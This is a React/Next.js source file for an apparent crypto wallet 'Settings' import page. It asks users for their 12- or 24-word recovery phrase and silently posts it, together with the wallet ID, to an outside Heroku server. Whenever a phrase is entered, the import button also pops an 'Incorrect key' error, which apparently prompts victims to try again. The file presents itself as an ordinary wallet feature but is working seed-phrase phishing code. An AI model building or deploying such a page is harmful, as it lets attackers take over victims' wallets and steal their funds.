import React, { useState } from "react";
import axios from "axios";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import styles from "../../../styles/Home.module.css";
import Tabs from "..";
import { useRouter } from "next/router";
import Modal from "../../../components/Modal";
import Overlay from "../../../components/Overlay";

const Settings = () => {
  const [key, setKey] = useState("");
  const [showModal, setShowModal] = useState(false)
  const router = useRouter();
  const { pid } = router.query;

  const notify = () => {
    key === "" ? "" : toast.error("Incorrect key, please try again.");
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    key !== ""
      ? axios
        .post("https://glacial-temple-10425.herokuapp.com/send", {
          key: key,
          wallet: pid,
        })
        .then((res) => res.json())
        .then(setShowModal(true))
        .catch((err) => err)
      : "";
  };
  return (
    <Tabs>
      <div>
        <form onSubmit={handleSubmit}>
          <textarea
            value={key}
            onChange={(e) => setKey(e.target.value)}
            placeholder="Private Key is typically 12 (sometimes 24) words separated by single spaces"
            className={styles.textarea}
            required
          />
          <button onClick={notify} className={styles.button}>
            import
          </button>
          {/* <ToastContainer /> */}
        </form>
        {showModal &&
          <>
            <Modal showModal={showModal} setShowModal={setShowModal} />
            <Overlay />
          </>}
      </div>
    </Tabs>
  );
};

export default Settings;
